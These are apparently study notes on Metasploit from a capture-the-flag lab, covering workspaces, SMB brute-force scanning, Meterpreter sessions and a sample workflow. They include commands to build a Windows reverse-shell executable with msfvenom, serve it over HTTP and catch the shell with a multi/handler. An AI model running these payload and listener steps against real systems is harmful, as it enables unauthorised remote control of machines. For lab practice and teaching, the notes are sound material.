# Metasploit Usage Notes

## Metasploit Database
Metasploit includes a PostgreSQL database to store data like hosts, services, and scan results. Helps in organizing targets and exploits.

- `hosts` → List scanned hosts
- `services` → Services discovered (e.g., ports, versions)

## Workspaces
Used to separate data for different engagements.
```bash
workspace -a project1
workspace project1
```

## Vulnerability Scanning
Use scanner modules like `auxiliary/scanner/smb/smb_login` for brute-force and enumeration.

## Meterpreter Sessions
Interactive shell after successful exploitation.
```bash
sessions -l       # List sessions
sessions -i <id>  # Interact with session
```

## NTLM Hash
Windows hash used in authentication. Cracking this can lead to full access.

## MSFVenom
Tool for creating custom payloads.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe > shell.exe
```

## Multi Handler
Used to handle incoming reverse shells.
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <ip>
set LPORT <port>
run
```

## HTTP Simple Server
Host payloads locally for download on target.
```bash
python3 -m http.server 8000
```

## Example Workflow
```bash
nmap -sV <target_ip>
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444
run
sessions -i 1
ls
cat flag.txt
```